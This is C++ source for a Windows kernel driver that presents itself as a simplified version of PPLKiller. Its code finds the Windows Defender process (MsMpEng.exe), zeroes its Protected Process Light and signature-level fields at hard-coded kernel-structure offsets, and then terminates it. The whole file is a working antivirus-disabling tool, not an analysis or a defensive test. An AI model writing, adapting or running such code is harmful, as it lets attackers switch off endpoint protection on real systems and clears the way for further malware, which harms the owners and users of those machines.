#include <ntddk.h>
#include <wdf.h>
#include <wdm.h>
#include "proc.h"

// 11jqaebmfbzzc.1v4sogdc16ffc.1yqiqfj889l7h.w0j3apzohylw

// This is a simplyfied version of PPLKiller

// offset are hard code the offset of the signature and protection, from debuuger on window 21h1 education
// 0x878 SignatureLevel
// 0x879 SectionSignatureLevel
// 0x87a Protection

#define SIGNATURE_LEVEL_OFFSET 0x878
#define SECTION_SIGNATURE_LEVEL_OFFSET 0x879
#define PS_PROTECTION_OFFSET 0x87a

static PCWSTR g_wsMsMpEng = L"MsMpEng.exe";

EXTERN_C_START

NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT     DriverObject,
    _In_ PUNICODE_STRING    RegistryPath
);

void DriverUnload(
    _In_ PDRIVER_OBJECT DriverObject
);

NTSTATUS
UnProtectWindefender(PHANDLE phDefenderHandle);

EXTERN_C_END

NTSTATUS
UnProtectWindefender(PHANDLE phDefenderHandle)
{
    PAGED_CODE();
    NTSTATUS Status;
    ULONG Size;
    PSYSTEM_PROCESS_INFORMATION pSystemProcessInfo = NULL, Entry;

    if ((Status = ZwQuerySystemInformation(
        SystemProcessInformation,
        NULL,
        0,
        &Size)) != STATUS_INFO_LENGTH_MISMATCH)
    {
        goto clean_up;
    }

    pSystemProcessInfo = (PSYSTEM_PROCESS_INFORMATION) ExAllocatePoolWithTag(NonPagedPool, Size, 'lkfd');

    if (pSystemProcessInfo == NULL)
    {
        Status = STATUS_NO_MEMORY;
        goto clean_up;
    }
    
    Status = ZwQuerySystemInformation(SystemProcessInformation,
        pSystemProcessInfo,
        Size,
        NULL);

    if (!NT_SUCCESS(Status))
    {
        goto clean_up;
    }

    Entry = pSystemProcessInfo;

    UNICODE_STRING unicode_MsMpEng;

    RtlInitUnicodeString(&unicode_MsMpEng, g_wsMsMpEng);

    while (true)
    {
        PEPROCESS Process;
        if (RtlEqualUnicodeString(&Entry->ImageName, &unicode_MsMpEng, TRUE))
        {
            *phDefenderHandle = Entry->UniqueProcessId;
            Status = PsLookupProcessByProcessId(Entry->UniqueProcessId, &Process);
            const ULONG Pid = HandleToULong(Entry->UniqueProcessId);
            if (NT_SUCCESS(Status))
            {
                const PPS_PROTECTION PsProtection = (PPS_PROTECTION)((PUCHAR)Process + PS_PROTECTION_OFFSET);

                //Check if windefeder is guarded with protection light                
                if (PsProtection->Level != 0 && PsProtection->s.Type == PsProtectedTypeProtectedLight)
                {
                    PsProtection->Level = 0;
                }
            }
            if (Pid != 0 && !PsIsSystemProcess(Process))
            {
                const PUCHAR SignatureLevelByte = (PUCHAR)(Process)+ SIGNATURE_LEVEL_OFFSET;
                const PUCHAR SectionSignatureLevelByte = (PUCHAR)(Process)+ SECTION_SIGNATURE_LEVEL_OFFSET;
                const UCHAR SignatureLevel = *SignatureLevelByte & 0xF;
                const UCHAR ImageSignatureType = (*SignatureLevelByte >> 4) & 0x7;
                const UCHAR SectionSignatureLevel = (*SectionSignatureLevelByte) & 0xF;


                if ((SignatureLevel == SE_SIGNING_LEVEL_MICROSOFT ||
                    SignatureLevel == SE_SIGNING_LEVEL_WINDOWS ||
                    SignatureLevel == SE_SIGNING_LEVEL_ANTIMALWARE ||
                    SignatureLevel == SE_SIGNING_LEVEL_WINDOWS_TCB)
                    &&
                    (SectionSignatureLevel == SE_SIGNING_LEVEL_MICROSOFT ||
                     SectionSignatureLevel == SE_SIGNING_LEVEL_WINDOWS))
                {
                    *SignatureLevelByte = 0;
                    *SectionSignatureLevelByte = 0;
                }
            }
            else
            {
                goto clean_up;
            }
            ObfDereferenceObject(Process);
        }

        if (Entry->NextEntryOffset == NULL)
        {
            goto clean_up;
        }
        Entry = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)Entry + Entry->NextEntryOffset);
    }

clean_up:
    if (pSystemProcessInfo != NULL) 
    {
        ExFreePoolWithTag(pSystemProcessInfo, 'lkfd');
    }
    return Status;
}

NTSTATUS 
DriverEntry(
    _In_ PDRIVER_OBJECT     DriverObject, 
    _In_ PUNICODE_STRING    RegistryPath
)
{
    PAGED_CODE();
    HANDLE      hDefender;
    NTSTATUS    Status = STATUS_SUCCESS;

    DriverObject->DriverUnload = DriverUnload;
    UNREFERENCED_PARAMETER(RegistryPath);
    Status = UnProtectWindefender(&hDefender);

    CLIENT_ID   ClientId = {
        hDefender,
        0
    };
    OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(static_cast<PUNICODE_STRING>(nullptr),
        OBJ_KERNEL_HANDLE);

    if (NT_SUCCESS(Status))
    {
        Status = NtOpenProcess(&hDefender, PROCESS_TERMINATE, &ObjectAttributes, &ClientId);

        if (NT_SUCCESS(Status)) ZwTerminateProcess(hDefender, 0);
    }
    return Status;
}

void DriverUnload(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    PAGED_CODE();
    UNREFERENCED_PARAMETER(DriverObject);
    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Driver unload sucessfully\n"));
}